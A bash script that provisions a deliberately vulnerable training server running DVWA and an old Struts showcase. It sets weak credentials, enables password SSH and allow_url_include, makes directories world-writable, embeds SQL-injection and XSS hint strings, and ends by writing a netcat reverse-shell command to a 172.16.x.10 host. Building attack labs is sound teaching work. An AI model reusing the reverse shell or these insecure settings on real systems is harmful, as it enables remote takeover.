#!/bin/bash
# Initialise the Linux server
#
sudo locale-gen en_GB.UTF-8
sudo adduser --shell /bin/bash --disabled-password --gecos "" user
echo "user:Automation123" | sudo chpasswd
sudo usermod -aG google-sudoers user
#
sudo sed -i '/PasswordAuthentication/d' /etc/ssh/sshd_config
echo "PasswordAuthentication yes" | sudo tee -a /etc/ssh/sshd_config
sudo restart ssh
#
sudo apt-get update
sudo apt-get install tomcat7 tomcat7-admin default-jre apache2 php5 php5-mcrypt php5-mysql php5-xmlrpc php5-gd git netcat-traditional libssl-dev libpam0g-dev zlib1g-dev dh-autoreconf unzip -y
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-server
#
# wget https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-all.zip
# unzip struts-2.5.12-all.zip
# sudo cp struts-2.5.12/lib/* /usr/share/tomcat7/lib/
#
# wget https://repo1.maven.org/maven2/org/apache/struts/struts2-rest-showcase/2.5.12/struts2-rest-showcase-2.5.12.war
# sudo cp struts2-rest-showcase-2.5.12.war /var/lib/tomcat7/webapps
#
wget https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/master/struts2_2.3.15.1-showcase.war
sudo cp struts2_2.3.15.1-showcase.war /var/lib/tomcat7/webapps
wget https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/master/tomcat-users.xml
sudo cp tomcat-users.xml /etc/tomcat7
sudo service tomcat7 restart
#
git clone https://github.com/ethicalhack3r/DVWA
sudo mv DVWA/* /var/www/html/
sudo rm -f /var/www/html/index.html
sudo cp /var/www/html/config/config.inc.php.dist /var/www/html/config/config.inc.php
sudo sed -i '/recaptcha/d' /var/www/html/config/config.inc.php
echo "\$_DVWA[ 'recaptcha_public_key' ]  = '6Lew5XEUAAAAAJKdUxQlWXsGGsFKasQA8Z3hw7Kv';" | sudo tee -a /var/www/html/config/config.inc.php
echo "\$_DVWA[ 'recaptcha_private_key' ] = '6Lew5XEUAAAAAAq3AsRTuY5FADGICfcIPHfIaF3K';" | sudo tee -a /var/www/html/config/config.inc.php
sudo sed -i '/>/d' /var/www/html/config/config.inc.php
sudo sed -i '/allow_url_include/d' /var/www/html/config/config.inc.php
echo "allow_url_include = On" | sudo tee -a /etc/php5/apache2/php.ini
sudo sed -i '/default_security/d' /var/www/html/config/config.inc.php
echo "\$_DVWA[ 'default_security_level' ] = 'low';" | sudo tee -a /var/www/html/config/config.inc.php
sudo sed -i '/password/d' /var/www/html/config/config.inc.php
echo "\$_DVWA[ 'db_password' ] = '';" | sudo tee -a /var/www/html/config/config.inc.php
echo "?>" | sudo tee -a /var/www/html/config/config.inc.php
sudo chmod 777 /var/www/html/hackable/uploads/
sudo chmod 666 /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt
sudo chmod 777 /var/www/html/config
sudo sed -i "s/avatar varchar(70)/avatar varchar(100)/g" /var/www/html/DVWA-master/dvwa/includes/DBMS/MySQL.php
# sudo sed -i "s/Database Setup/Just press the Create-Reset Database button below/g" /var/www/html/setup.php
sudo sed -i "s/More Information/' OR '1'='1/g" /var/www/html/vulnerabilities/sqli/index.php
sudo sed -i "s/More Information/script alert('compromised')script/g" /var/www/html/vulnerabilities/xss_r/index.php
sudo sed -i "s/'SQL Injection'/'* SQL Injection'/g" /var/www/html/dvwa/includes/dvwaPage.inc.php
sudo sed -i "s/'XSS (Reflected)'/'* XSS (Reflected)'/g" /var/www/html/dvwa/includes/dvwaPage.inc.php
sudo sed -i "s/Username/Username is admin/g" /var/www/html/login.php
sudo sed -i "s/Password/Password is password/g" /var/www/html/login.php
sudo service apache2 restart
#
sudo git clone https://github.com/shellinabox/shellinabox.git
cd shellinabox
sudo autoreconf -i
sudo ./configure
sudo make
sudo wget https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/master/shell-style.css
su -c "./shellinaboxd -b -q -t --user-css Normal:+shell-style.css" -s /bin/sh user
#
sudo touch /home/user/.bashrc
sudo echo -e "\n\n+ -- --=[ Pre-canned ]=-- -- +\n\n    ./netcat.sh\n\n" >> /etc/motd
sudo touch /home/user/netcat.sh
sudo echo "nc.traditional -e /bin/bash 172.16.$1.10 80" > /home/user/netcat.sh
sudo chmod 755 /home/user/netcat.sh
